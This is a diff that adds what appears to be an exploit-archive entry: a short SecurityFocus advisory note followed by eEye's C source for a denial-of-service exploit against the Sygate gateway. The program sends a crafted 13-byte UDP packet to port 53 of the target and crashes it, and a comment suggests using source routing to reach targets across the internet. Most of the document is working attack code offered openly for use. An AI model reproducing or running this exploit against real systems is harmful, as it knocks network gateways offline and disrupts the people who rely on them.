@@ -1,0 +1,39 @@
+source: http://www.securityfocus.com/bid/1420/info
+
+An exploit which causes a Denial of Service to Sybergen's Sygate when run from an internal machine has been released. The exploit sends a UDP packet to port 53 of the gateway. 
+
+//Sygate Crash by: marc@eeye.com (April-00)
+//http://www.eEye.com
+//Will crash Sygate (http://www.sygate.com/) when ran from the internal LAN.
+//Play with source routing to get it to work across the internet.
+//Just hit the Internal IP of the Sygate machine.
+
+#include <stdio.h>
+#include <arpa/inet.h>
+
+int main (int argc, char **argv)
+{
+        int SockFD, addrlen, bsent;
+        struct sockaddr_in UDPSock;
+        char bomb[]= "changeiscoming";
+
+        printf("Sygate Crash by: marc@eeye.com\n");
+        printf("http://www.eEye.com\n\n");
+
+        if(argc<2){
+                printf("Usage: %s [server]\n",argv[0]);
+                exit(1);
+        }
+
+        SockFD=socket(AF_INET, SOCK_DGRAM, 0);
+
+        UDPSock.sin_family=AF_INET;
+        UDPSock.sin_addr.s_addr=inet_addr(argv[1]);
+        UDPSock.sin_port=htons(53);
+
+        bsent=sendto(SockFD,&bomb,13,0,(struct sockaddr *) &UDPSock,
+sizeof(struct sockaddr_in));
+
+        printf("Sent Crash.\nBytes Sent: %i\n",bsent);
+}
+
